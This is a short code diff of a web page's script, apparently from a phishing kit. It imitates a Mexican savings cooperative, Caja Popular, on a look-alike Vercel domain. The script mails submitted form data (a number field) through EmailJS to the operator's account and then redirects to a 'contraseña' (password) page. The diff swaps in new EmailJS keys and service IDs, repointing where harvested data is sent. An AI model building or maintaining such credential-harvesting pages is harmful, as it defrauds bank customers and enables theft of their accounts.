@@ -34,7 +34,7 @@
 <script>
     // Inicializar EmailJS
     (function() {
-        emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' por tu ID de usuario de EmailJS
+        emailjs.init('TjfWR45gKLagfeSGP'); // Reemplaza 'YOUR_USER_ID' por tu ID de usuario de EmailJS
     })();
 
     var input = document.querySelector(".pedirnumeroinput");
@@ -66,7 +66,7 @@
         var form = document.getElementById('my-form');
 
         // Enviar el formulario usando EmailJS
-        emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
+        emailjs.sendForm('service_g9bbsu4', 'template_onwr8wg', form)
             .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
                 window.location.href = 'https://cajapopulardelosmexicanosnet.vercel.app/contraseña.html';
